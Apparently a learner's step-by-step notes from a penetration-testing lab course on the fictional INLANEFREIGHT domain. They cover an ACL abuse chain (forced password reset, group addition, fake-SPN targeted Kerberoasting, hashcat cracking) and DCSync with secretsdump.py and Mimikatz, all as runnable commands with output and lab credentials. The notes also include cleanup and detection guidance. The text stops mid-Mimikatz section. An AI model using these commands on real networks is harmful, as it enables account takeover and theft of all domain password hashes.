VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
→ Command is executing

VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
→ SUCCESS = damundsen's password is now 'Pwn3d_by_ACLs!'
→ We can now login as damundsen
→ Real damundsen user is now LOCKED OUT of their account
→ This is why you consult client before doing this

Why this is noisy and risky:

damundsen will try to login tomorrow morning
→ Their password does not work anymore
→ They call IT support
→ IT looks at logs
→ Sees password was changed at 2am by wley
→ wley is flagged as suspicious
→ Investigation begins
→ Your assessment might be discovered

ALWAYS:
→ Get written permission from client first
→ Document the exact time you changed it
→ Revert the password after the assessment
→ Or set it to something the client tells you
4. Attack Step 2 - Add damundsen to Help Desk Level 1
Task 4 - Create Credential Object for damundsen
powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

Breaking down:

We are now creating credentials for DAMUNDSEN
not wley anymore

'Pwn3d_by_ACLs!'               → the password WE just set
                                  for damundsen in previous step

'INLANEFREIGHT\damundsen'      → damundsen's full domain username

$Cred2                         → NEW credential object
                                  named Cred2 to distinguish from
                                  wley's credential in $Cred

Why damundsen and not wley:
→ GenericWrite on Help Desk Level 1 belongs to DAMUNDSEN
→ wley does NOT have this right
→ We must act AS damundsen to add to that group
→ = We use $Cred2 for all future commands
Task 5 - Verify damundsen is NOT in Group Yet
powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

Breaking down:

Get-ADGroup                     → built-in PowerShell AD command
                                  gets information about a group
                                  does NOT need PowerView

-Identity "Help Desk Level 1"  → which group to look up
                                  use quotes = name has spaces

-Properties *                   → get ALL properties
                                  including Members list

| Select -ExpandProperty Members
                                → extract just the Members property
                                  shows all current group members
                                  as Distinguished Names (DNs)

What you find:

CN=Stella Blagg,OU=Operations...
CN=Marie Wright,OU=Operations...
CN=Jerrell Metzler,OU=Operations...
[many more members listed]
CN=Dagmar Payne,OU=HelpDesk...

= damundsen is NOT in this list
= Confirms we have not added them yet
= Good baseline to compare after attack
Task 6 - Add damundsen to Help Desk Level 1
powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

Breaking down:

Add-DomainGroupMember           → PowerView function
                                  adds a user to an AD group
                                  uses GenericWrite right we found

-Identity 'Help Desk Level 1'  → WHICH group to add to
                                  the target group

-Members 'damundsen'            → WHO to add to the group
                                  we are adding damundsen to
                                  the group that damundsen
                                  has GenericWrite over
                                  = adding themselves

-Credential $Cred2              → authenticate AS damundsen
                                  damundsen is the one who has
                                  GenericWrite on this group
                                  if we use wley creds here = fails

-Verbose                        → show what is happening

What you see:

VERBOSE: [Get-PrincipalContext] Using alternate credentials
→ Using damundsen's credentials

VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
→ SUCCESS = damundsen now in Help Desk Level 1
→ damundsen now INHERITS all Help Desk Level 1 rights
→ Help Desk Level 1 is nested in IT group
→ damundsen ALSO inherits IT group rights
→ IT group has GenericAll over adunn
→ damundsen now has GenericAll over adunn
→ WE (acting as damundsen) have GenericAll over adunn
Task 7 - Confirm damundsen was Added
powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

Breaking down:

Get-DomainGroupMember           → PowerView function
                                  lists all members of a group

-Identity "Help Desk Level 1"  → which group to check

| Select MemberName             → only show the username
                                  cleaner output

What you find:

MemberName
----------
busucher
spergazed
[other members]
damundsen       ← damundsen is now in the group ✅
dpayne

= Confirmed = damundsen successfully added
= Attack step 2 complete
= Now have GenericAll over adunn through nesting
5. Attack Step 3 - Targeted Kerberoasting on adunn
Why Targeted Kerberoasting Instead of Password Reset

This is a very important concept. We have GenericAll over adunn which means we COULD reset adunn's password. But the module says adunn is an admin account that cannot be interrupted. If we reset an admin's password, they immediately lose access, call IT, investigation starts, our assessment is blown. Instead we use a SMARTER and STEALTHIER approach called Targeted Kerberoasting. We assign a fake SPN to adunn (using our GenericWrite that comes with GenericAll), request a Kerberos ticket for that SPN, and crack it offline. adunn never loses access and nothing obviously breaks. Much more professional.

Option A: Reset adunn password (NOISY)
→ adunn cannot login = immediate alert
→ Admin calls IT = investigation
→ Assessment potentially blown

Option B: Targeted Kerberoasting (STEALTHY)
→ We add fake SPN to adunn = nobody notices
→ Request TGS ticket = looks like normal Kerberos traffic
→ Crack ticket offline = silent
→ adunn still works normally = no alert
→ We get password without disrupting anything

ALWAYS prefer Option B for admin accounts
Task 8 - Assign Fake SPN to adunn
powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

Breaking down every part:

Set-DomainObject                → PowerView function
                                  modifies attributes of any AD object
                                  this is the GenericWrite abuse

-Credential $Cred2              → authenticate as damundsen
                                  damundsen inherited GenericAll
                                  from IT group via nested membership
                                  GenericAll includes GenericWrite
                                  = can set SPN on adunn

-Identity adunn                 → WHICH object to modify
                                  = the adunn user account

-SET @{serviceprincipalname='notahacker/LEGIT'}
                                → SET = modify this attribute
                                  serviceprincipalname = the SPN attribute
                                  'notahacker/LEGIT' = fake SPN value
                                  format = ServiceClass/Host
                                  the name does not matter at all
                                  it just needs to exist
                                  now adunn has an SPN
                                  = adunn is now Kerberoastable

-Verbose                        → show detailed output

What you see:

VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
→ Using damundsen creds

VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
→ SUCCESS = adunn now has SPN 'notahacker/LEGIT'
→ adunn is now Kerberoastable
→ We can request TGS ticket for this SPN
→ Ticket encrypted with adunn's NTLM hash
→ Crack it = get adunn's password
Task 9 - Kerberoast adunn with Rubeus
powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap

Breaking down:

.\Rubeus.exe                    → run Rubeus executable
                                  from current directory

kerberoast                      → Kerberoasting module
                                  requests TGS tickets

/user:adunn                     → only Kerberoast THIS specific user
                                  targeted = less noise
                                  only one ticket requested

/nowrap                         → do not wrap hash across multiple lines
                                  keeps hash on ONE long line
                                  = easy to copy to hashcat file
                                  ALWAYS use this flag

What you find:

[*] SamAccountName    : adunn
[*] ServicePrincipalName: notahacker/LEGIT  ← our fake SPN
[*] Supported ETypes  : RC4_HMAC_DEFAULT    ← RC4 = fast to crack
[*] Hash              : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$[LONG HASH]

= We have the TGS ticket for adunn
= Encrypted with adunn's NTLM password hash
= Need to crack this to get adunn's plaintext password
Task 10 - Crack adunn's Hash on Linux
bash
# Save hash to file
echo '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT*$[PASTE FULL HASH]' > adunn_hash.txt

# Crack it
hashcat -m 13100 adunn_hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked password
hashcat -m 13100 adunn_hash.txt /usr/share/wordlists/rockyou.txt --show

If cracked you get:

$krb5tgs$23$*adunn$...[hash]...:SomePassword123
                                 ↑
                         adunn's actual password

Now you have:
Username: adunn
Password: SomePassword123
= Can authenticate as adunn
= adunn has DCSync rights
= Can dump all domain hashes
= Full domain compromise achieved
6. Cleanup - CRITICAL Section

Cleanup is not optional. It is a professional and ethical requirement. After every ACL attack we must undo every change we made to the environment. The order of cleanup matters because if we remove damundsen from the group first we lose the GenericAll right needed to remove the fake SPN from adunn.

Correct Cleanup Order
WRONG ORDER (will fail):
1. Remove damundsen from Help Desk Level 1  ← lose GenericAll right
2. Try to remove SPN from adunn             ← FAILS no permission

CORRECT ORDER:
1. Remove fake SPN from adunn first         ← still have GenericAll
2. Then remove damundsen from group         ← then lose the right
3. Then reset damundsen password            ← notify client
Task 11 - Remove Fake SPN from adunn (FIRST)
powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

Breaking down:

Set-DomainObject                → same PowerView function as before

-Credential $Cred2              → still using damundsen creds
                                  damundsen still has GenericAll
                                  because still in Help Desk Level 1
                                  DO THIS BEFORE removing from group

-Identity adunn                 → modifying adunn account

-Clear serviceprincipalname     → CLEAR = completely remove this attribute
                                  removes the SPN we added
                                  adunn will no longer be Kerberoastable
                                  restores to original state

-Verbose                        → confirm it worked

What you see:

VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
→ SUCCESS = fake SPN removed
→ adunn account restored to pre-attack state
→ No more Kerberoasting possible for adunn
→ Now safe to remove damundsen from group
Task 12 - Remove damundsen from Help Desk Level 1 (SECOND)
powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

Breaking down:

Remove-DomainGroupMember        → PowerView function
                                  removes a user from a group
                                  opposite of Add-DomainGroupMember

-Identity "Help Desk Level 1"  → which group to remove from

-Members 'damundsen'            → who to remove

-Credential $Cred2              → still using damundsen creds
                                  damundsen still HAS GenericWrite
                                  on this group = can remove themselves

-Verbose                        → confirm success

What you see:

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True    ← True means successful removal
Task 13 - Verify Removal
powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose

Breaking down:

Get-DomainGroupMember           → list all group members

| Select MemberName             → get just usernames

| ? {$_.MemberName -eq 'damundsen'}
                                → filter for ONLY damundsen
                                  if nothing returned = not in group
                                  = removal successful

-Verbose                        → extra detail

What you find:

[empty output = no results]
→ damundsen is NOT in the group anymore
→ Cleanup successful
→ Environment restored to pre-attack state
7. Detection - How Defenders Catch This Attack
Event ID 5136 - The Most Important Detection

Event ID 5136 fires whenever any directory service object is modified. This includes when we added a fake SPN to adunn, when we added damundsen to a group, and when we changed damundsen's password. Defenders who have Advanced Security Audit Policy enabled will see these events in their SIEM.

powershell
# Defenders see SDDL strings in logs which are unreadable
# They can decode them with this command:

ConvertFrom-SddlString "O:BAG:BAD:AI(...)" | select -ExpandProperty DiscretionaryAcl

What defenders find:

After running ConvertFrom-SddlString they see:

INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, ...)
↑
This shows mrb3n was given GenericWrite on domain object
= Clear indicator of ACL attack
= Defender knows to investigate mrb3n account immediately

Other suspicious entries they look for:
→ Unknown user added to privileged group
→ SPN assigned to non-service account
→ Password reset at unusual hours
→ Multiple Event ID 5136 in quick succession
What Defenders Monitor
Event ID 5136: Directory service object modified
→ Fires when ACL is changed
→ Fires when SPN is added/removed
→ Fires when group membership changes
→ ALL of our attack steps generate this

Event ID 4728: A member was added to a security group
→ Fires when we add damundsen to Help Desk Level 1
→ Shows who was added, when, by who

Event ID 4723: An attempt was made to change an account password
→ Fires when we reset damundsen's password
→ Shows old account, new account performing reset

Event ID 4769: Kerberos service ticket was requested
→ Fires when we Kerberoast adunn
→ RC4 encryption type for admin account = suspicious

Signs that trigger defender alerts:
→ Admin account suddenly has SPN set
→ User added to group they were not in before
→ Password reset at 2am
→ Multiple 5136 events in short succession
→ Mass Kerberos TGS requests
8. Complete Attack Chain - All Commands in Order
powershell
# ================================================
# SETUP
# ================================================
cd C:\Tools
Import-Module .\PowerView.ps1

# ================================================
# STEP 1: Authenticate as wley
# ================================================
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# ================================================
# STEP 2: Reset damundsen password using wley rights
# ================================================
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# ================================================
# STEP 3: Authenticate as damundsen
# ================================================
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# ================================================
# STEP 4: Verify damundsen not in group yet
# ================================================
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# ================================================
# STEP 5: Add damundsen to Help Desk Level 1
# ================================================
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# ================================================
# STEP 6: Confirm group membership
# ================================================
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# ================================================
# STEP 7: Add fake SPN to adunn for Kerberoasting
# ================================================
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# ================================================
# STEP 8: Kerberoast adunn
# ================================================
.\Rubeus.exe kerberoast /user:adunn /nowrap
# Copy the $krb5tgs$23$* hash

# ================================================
# CRACK ON LINUX
# hashcat -m 13100 adunn_hash.txt /usr/share/wordlists/rockyou.txt
# ================================================

# ================================================
# CLEANUP (MUST DO IN THIS ORDER)
# ================================================

# Remove fake SPN FIRST (before losing GenericAll)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Then remove damundsen from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Verify removal
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}

# Contact client about damundsen password reset
# They need to set it back or notify the real damundsen
9. Key Things to Remember
1. ALWAYS create PSCredential objects for each user
   You physically run as htb-student
   But PowerView acts AS the credential you provide
   Wrong credential = wrong permissions = attack fails

2. Use $Cred for wley actions
   Use $Cred2 for damundsen actions
   Never mix them up or permissions will fail

3. Targeted Kerberoasting > password reset for admins
   Password reset = immediate disruption = detection
   Targeted Kerberoast = silent = professional
   Use password reset only when client explicitly allows it

4. Cleanup order MATTERS
   Remove SPN first
   THEN remove from group
   Reverse order = you lose the permission = SPN stays forever

5. -Verbose flag on every command
   Shows exactly what is happening
   Makes troubleshooting easy
   Documents your actions in terminal output

6. Document everything with timestamps
   What you changed
   When you changed it
   What credential was used
   Client needs this for their records
   You need this if questions arise later

7. Event ID 5136 = defenders can see ACL attacks
   Every modification generates this event
   If defenders have good SIEM = they might catch you
   Work quickly and clean up immediately

8. The nested group trick is extremely common in real orgs
   Help Desk → IT Support → IT Admins → Domain Admins
   These chains exist everywhere
   BloodHound finds them in seconds
   Manual enumeration takes hours

9. ConvertFrom-SddlString = how defenders read ACL logs
   SDDL is unreadable garbage by default
   This cmdlet translates it to human readable
   Defenders use this to understand what was changed

10. This attack requires PLANNING not just commands
    Understand the chain before executing
    Know what each step enables
    Know what order cleanup must happen
    Know what will alert defenders
    = Professional pentesters plan everything

DCSync Attack - Complete Detailed Notes
1. What is DCSync? (Simple Explanation)

DCSync is one of the most powerful and devastating attacks possible against an Active Directory domain. To understand it simply, think about how Domain Controllers work. In large organizations there are often multiple Domain Controllers for redundancy and load balancing. These Domain Controllers need to stay synchronized with each other so they all have the same information. They do this through a process called replication where one DC asks another DC to send it all the latest changes including password hashes. DCSync abuses this legitimate replication mechanism by pretending to BE a Domain Controller and asking the real DC to send us all the password hashes just like a real DC-to-DC sync would happen. The real DC has no way to tell we are not a legitimate DC so it happily sends us everything we ask for including the NTLM hash of every single user in the domain including the Administrator and krbtgt accounts.

Normal Legitimate DC Replication:
DC1 → asks DC2 → "send me all changes since last sync"
DC2 → sends all password hashes, user data, etc
DC1 → updates its database
= Normal daily operation of any AD environment

DCSync Attack:
Attacker pretends to be DC1
Attacker → asks real DC2 → "send me all changes"
DC2 → thinks it is talking to another DC
DC2 → sends ALL password hashes to attacker
Attacker → captures every single hash in the domain
= Administrator, krbtgt, every user = all hashes
= Full domain compromise in one command
2. What Rights Are Required for DCSync?

DCSync requires two very specific extended rights on the domain object. These rights are normally only given to Domain Controllers and highly privileged administrative accounts. However as we saw in the previous section, misconfigurations can give these rights to regular user accounts which is exactly the misconfiguration we discovered with adunn.

Required Permissions (BOTH needed together):

1. DS-Replication-Get-Changes
   → Basic replication right
   → Allows reading normal AD data
   → Not enough by itself

2. DS-Replication-Get-Changes-All
   → Extended replication right
   → Allows reading SECRET data
   → Password hashes, Kerberos keys
   → THIS is the critical one
   → Must have BOTH for full DCSync

Who normally has these rights:
→ Domain Admins group = YES by default
→ Enterprise Admins group = YES by default
→ Domain Controllers = YES by default
→ adunn = YES (misconfiguration = our way in)

How we discovered adunn has these rights:
→ ACL enumeration in previous section
→ Get-DomainObjectACL showed both permissions
→ Assigned to adunn's SID on domain object
→ = Perfect target for DCSync attack
3. Verify adunn's DCSync Rights Before Attacking

Before performing the attack it is professional practice to confirm the rights exist. This prevents wasted time and ensures we document exactly what permissions are misconfigured for our report.

Task 1 - Check adunn's Group Membership and Account Info
powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

Breaking down:

Get-DomainUser              → PowerView function
                              gets user information from AD

-Identity adunn             → specifically get adunn user

| select                    → choose which fields to show

samaccountname              → the login username (adunn)

objectsid                   → the unique SID for this user
                              we need this for the next command
                              S-1-5-21-...-1164

memberof                    → what groups adunn belongs to
                              shows current group memberships

useraccountcontrol          → account flags
                              NORMAL_ACCOUNT = regular user
                              DONT_EXPIRE_PASSWORD = password never expires
                              useful for report findings

| fl                        → format-list = show all details
                              one property per line
                              easier to read than table format

What you find:

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
                     ↑ SAVE THIS SID for next command

memberof           : CN=VPN Users, CN=Shared Calendar Read,
                     CN=Printer Access, CN=File Share H Drive...
                     ↑ adunn is in NORMAL groups
                     = NOT in Domain Admins
                     = Looks like a regular user
                     = Makes this misconfiguration even more dangerous
                     because defenders might not think to check

useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
                     ↑ just a normal account
                     = nothing suspicious about the account itself
                     = the danger is HIDDEN in ACL settings
Task 2 - Confirm Replication Rights Using Get-ObjectAcl
powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

Breaking down every part:

$sid = "S-1-5-21-...-1164"     → store adunn's SID from previous command
                                  we search by SID not username

Get-ObjectAcl                   → PowerView function
                                  gets ACL entries for a specific object

"DC=inlanefreight,DC=local"    → WHICH object to check ACL of
                                  this is the ROOT DOMAIN OBJECT
                                  DCSync rights must be on THIS object
                                  not on individual users
                                  the domain root = most powerful target

-ResolveGUIDs                   → translate GUIDs to readable names
                                  DS-Replication-Get-Changes
                                  instead of
                                  1131f6aa-9c07-11d1-f79f-00c04fc2dcd2

| ? { ($_.ObjectAceType         → filter results
   -match 'Replication-Get')}     only show ACEs containing
                                  'Replication-Get' in the type name
                                  = only show replication related rights
                                  reduces massive output to relevant entries

| ?{$_.SecurityIdentifier       → second filter
   -match $sid}                   only show ACEs where the SID
                                  matches adunn's SID
                                  = only show adunn's rights

| select AceQualifier, ObjectDN,
ActiveDirectoryRights,
SecurityIdentifier, ObjectAceType
                                → only show these specific columns
                                  removes noise from output

| fl                            → format-list = clean readable output

What you find:

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-...-1164  ← adunn's SID
ObjectAceType         : DS-Replication-Get-Changes  ← RIGHT 1 ✅

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-...-1164  ← adunn's SID
ObjectAceType         : DS-Replication-Get-Changes-All  ← RIGHT 2 ✅

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-...-1164  ← adunn's SID
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set ← BONUS

= adunn has ALL THREE replication rights
= DS-Replication-Get-Changes = RIGHT 1 confirmed
= DS-Replication-Get-Changes-All = RIGHT 2 confirmed
= BOTH required rights present = DCSync attack confirmed possible
= Documented proof of the misconfiguration for report
4. Method 1 - DCSync Using secretsdump.py (From Linux)
What is secretsdump.py?

secretsdump.py is part of the Impacket toolkit and is one of the most powerful credential dumping tools available. It can perform DCSync attacks remotely from a Linux attack host over the network using just a set of credentials. Unlike Mimikatz which requires you to be physically running on a Windows machine in the context of the privileged user, secretsdump.py connects remotely to the DC over the network using the DRSUAPI (Directory Replication Service API) protocol and requests all the password hashes. It is extremely versatile and can also dump SAM databases, LSA secrets, and NTDS.dit files using various methods.

Task 3 - Perform Full DCSync with secretsdump.py
bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

Breaking down every part:

secretsdump.py              → Impacket script
                              performs credential dumping
                              via multiple methods including DCSync

-outputfile inlanefreight_hashes
                            → save all output to files
                              with this prefix/name
                              creates THREE files:
                              inlanefreight_hashes.ntds
                              inlanefreight_hashes.ntds.cleartext
                              inlanefreight_hashes.ntds.kerberos

-just-dc                    → only perform DCSync
                              extracts NTLM hashes AND Kerberos keys
                              from the NTDS database
                              does NOT try other methods (SAM, LSA)
                              faster and cleaner

INLANEFREIGHT/adunn         → domain/username to authenticate as
                              = we are acting AS adunn
                              = adunn has the DCSync rights

@172.16.5.5                 → @ then Domain Controller IP
                              = which DC to target for replication
                              tool will prompt for adunn's password

What you find:

[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
→ Boot key extracted = needed to decrypt NTDS

[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit
→ Found the AD database file location

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
→ Starting to dump hashes

inlanefreight.local\administrator:500:aad3b435...:88ad09182de639ccc6579eb0849751cf:::
                    ↑           ↑   ↑            ↑
                 username      RID  LM hash      NTLM hash ← this is what we crack
                                    (usually blank/useless)

krbtgt:502:aad3b435...:16e26ba33e455a8c338142af8d89ffbc:::
→ krbtgt hash = used for Golden Ticket attacks
→ VERY valuable = persistence mechanism

inlanefreight.local\avazquez:1112:...:58a478135a93ac3bf058a5ea0e8fdb71:::
→ Every regular user hash is here too

[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\...
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
→ Some accounts store password in reversible encryption
→ secretsdump automatically decrypts these
→ We get PLAINTEXT passwords directly = no cracking needed
Task 4 - List Output Files Created
bash
ls inlanefreight_hashes*

What you find:

inlanefreight_hashes.ntds           ← NTLM hashes for ALL users
inlanefreight_hashes.ntds.cleartext ← cleartext passwords (reversible encryption accounts)
inlanefreight_hashes.ntds.kerberos  ← Kerberos keys for all accounts

Each file serves different purposes:
.ntds          → use for Pass-the-Hash attacks
                 use for offline cracking with hashcat
                 format: username:RID:LMhash:NTLMhash

.ntds.cleartext→ already plaintext = use directly for login
                 rare but extremely valuable when present

.ntds.kerberos → use for Pass-the-Ticket attacks
                 Kerberos keys for Golden/Silver ticket attacks
Task 5 - DCSync with Additional Useful Flags
bash
# Get ONLY NTLM hashes (no Kerberos keys)
secretsdump.py -outputfile inlanefreight_hashes -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Get hash for ONE specific user only
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5

# Include password history (useful for cracking patterns)
secretsdump.py -outputfile inlanefreight_hashes -just-dc -history INLANEFREIGHT/adunn@172.16.5.5

# Include when passwords were last set
secretsdump.py -outputfile inlanefreight_hashes -just-dc -pwd-last-set INLANEFREIGHT/adunn@172.16.5.5

# Include disabled account status
secretsdump.py -outputfile inlanefreight_hashes -just-dc -user-status INLANEFREIGHT/adunn@172.16.5.5

Why each flag matters:

-just-dc-ntlm       → faster than -just-dc
                      only NTLM hashes no Kerberos keys
                      use when you only want to crack/pass hashes

-just-dc-user       → targeted extraction
                      only pulls specific user
                      less noise on the wire
                      useful for specific targets

-history            → shows previous passwords
                      users often reuse passwords
                      if current hash doesnt crack
                      old password might = clues to new one
                      useful for password policy analysis in report

-pwd-last-set       → shows when password was last changed
                      old password date = might not have been rotated
                      helps client understand password hygiene
                      useful for report statistics

-user-status        → shows disabled accounts
                      CRITICAL for reporting
                      if you report 500 cracked passwords
                      and 200 are disabled accounts
                      client needs to know that
                      filter disabled = accurate statistics
5. Finding Reversible Encryption Accounts
What is Reversible Encryption?

Reversible encryption is a setting on user accounts that stores the password in a way that can be decoded back to plaintext. This exists for legacy application compatibility reasons where some older applications needed the actual plaintext password not just a hash to authenticate. It is a severe security misconfiguration because it essentially stores passwords in a recoverable format. secretsdump.py automatically detects and decrypts these passwords during a DCSync attack giving you plaintext credentials without needing to crack anything.

Normal Password Storage:
User sets password "Password123"
→ Windows hashes it: 8846F7EAEE8FB117AD06BDD830B7586C
→ Hash stored in AD
→ To recover = must crack the hash offline
→ Takes time, might fail on strong passwords

Reversible Encryption:
User sets password "Password123"
→ Windows encrypts with RC4: [encrypted blob]
→ Encrypted blob stored in AD
→ Key to decrypt stored in registry (Syskey)
→ Anyone with DCSync rights = can decrypt instantly
→ Gets "Password123" directly = no cracking needed
→ MUCH more dangerous than normal storage
Task 6 - Find Accounts with Reversible Encryption (Method 1 - Get-ADUser)
powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

Breaking down:

Get-ADUser                  → built-in PowerShell AD command

-Filter 'userAccountControl -band 128'
                            → filter users by account control flags
                              -band = bitwise AND operation
                              128 = the decimal value for the
                              ENCRYPTED_TEXT_PWD_ALLOWED flag
                              = find accounts where this bit is SET
                              = find accounts with reversible encryption

-Properties userAccountControl
                            → include this property in output
                              shows the full list of account flags

What you find:

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts...
Name               : PROXYAGENT
SamAccountName     : proxyagent
userAccountControl : 640
                     ↑ 640 includes the 128 bit
                     = reversible encryption is ON for proxyagent
Task 7 - Find Accounts with Reversible Encryption (Method 2 - PowerView)
powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

Breaking down:

Get-DomainUser -Identity *  → get ALL domain users

| ? {$_.useraccountcontrol  → filter where useraccountcontrol
-like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
                              contains this specific flag name
                              PowerView translates the numeric
                              flag to readable text
                              easier to understand than -band 128

| select samaccountname,    → only show username and
useraccountcontrol            the account control flags

What you find:

samaccountname    useraccountcontrol
--------------    ------------------
proxyagent        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

= proxyagent has reversible encryption enabled
= When we run DCSync we will get proxyagent's cleartext password
= No cracking needed for this account
Task 8 - View the Cleartext Password After DCSync
bash
cat inlanefreight_hashes.ntds.cleartext

What you find:

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!

= proxyagent's actual password in plaintext
= Pr0xy_ILFREIGHT!
= Can use this directly to login
= No hashcat needed for this account
6. Method 2 - DCSync Using Mimikatz (From Windows)
Why Use Mimikatz Instead of secretsdump.py?

Mimikatz is the original tool that made DCSync attacks famous. It runs on Windows and can perform DCSync by targeting specific user accounts one at a time. The key requirement is that Mimikatz must run in the context of the user who has DCSync rights. We cannot just run Mimikatz as our regular user and tell it to use adunn's credentials like we do with PowerView. We must actually launch Mimikatz AS adunn using the runas command.

secretsdump.py:
→ Runs from Linux
→ Remote attack over network
→ Pass credentials as parameter
→ Gets ALL hashes at once
→ Writes to output files automatically
→ Easier for bulk dumping

Mimikatz DCSync:
→ Runs on Windows
→ Must run IN CONTEXT of privileged user
→ Targets specific users (not all at once)
→ Good when you need specific hashes only
→ More targeted and controlled
→ Good when you are on Windows host already
Task 9 - Launch PowerShell as adunn Using runas
cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell

Breaking down:

runas                       → Windows built-in command
                              runs a program as different user

/netonly                    → CRITICAL flag
                              uses the credentials ONLY for
                              network authentication
                              local commands still run as you
                              network commands (like DCSync) use adunn
                              = we authenticate to DC as adunn
                              but our local machine still works normally

/user:INLANEFREIGHT\adunn  → which user to run as
                              must include domain\username
                              will prompt for adunn's password

powershell                  → which program to launch
                              opens new PowerShell window
                              running with adunn's network credentials

What happens:

A new PowerShell window opens
This PowerShell has adunn's network credentials
When we run Mimikatz in this window:
→ Mimikatz authenticates to DC as adunn
→ adunn has DCSync rights
→ DCSync attack works

If we run Mimikatz in our ORIGINAL window (as htb-student):
→ Mimikatz authenticates to DC as htb-student
→ htb-student has NO DCSync rights
→ DCSync attack FAILS with access denied
Task 10 - Run Mimikatz and Enable Debug Privileges
powershell
# In the new runas window - navigate to Mimikatz
cd C:\Tools
.\mimikatz.exe
mimikatz # privilege::debug

Breaking down:

privilege::debug            → requests SeDebugPrivilege
                              this privilege allows access to
                              processes owned by other users
                              required for many Mimikatz functions
                              including DCSync
                              if this fails = not running as admin
                              or token does not have the right

Expected output:
Privilege '20' OK
↑
20 = SeDebugPrivilege number
OK = successfully obtained the privilege
= Ready to perform DCSync
Task 11 - Perform DCSync with Mimikatz
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

Breaking down:

lsadump::dcsync             → Mimikatz DCSync module
                              lsadump = credential dumping module
